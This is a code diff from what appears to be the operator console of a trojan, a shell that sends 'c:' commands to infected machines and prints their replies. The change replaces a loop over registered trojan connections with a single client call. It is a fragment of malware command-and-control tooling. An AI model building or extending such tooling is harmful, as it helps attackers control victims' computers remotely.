@@ -4,6 +4,7 @@ from JTShell.processes import Process
 from JTShell.util.message import Message
 from JTShell.util.ansi import Colors
 from util import trojanrecv
+from util import TrojanMessage
 import sys
 
 
@@ -34,17 +35,9 @@ class CommandShell(TrojanShell):
                         break
                 # skipping the whole procedure in case the command prompt is empty
                 if command != "" and command != " ":
-                    # going through every individual connected trojan in the register
-                    for trojanconnection in self.trojanregister:
-                        trojanconnection.activate()
-                        print("")
-                        trojanconnection.send("c:" + command)
-                        message_type = trojanrecv(Process(self, "", processname="", layer="fg"), trojanconnection)
-                        if message_type == "error":
-                            print(str(Message("error", "{0}: failed to execute command".format(trojanconnection.ip))))
-                        else:
-                            print(str(Message("result", "{0} successfully executed command".format(trojanconnection.ip))))
-                        trojanconnection.deactivate()
+                    # calling the execute function of the client, and printing it
+                    reply = TrojanMessage(self.client.execute_wait("c:" + command).replace("\\r\\n", "\n"))
+                    print(reply.message)
+
         except SystemExit:
-            self.trojanregister.clear()
-            # self.trojanlist.save_registered_trojans()
+            pass
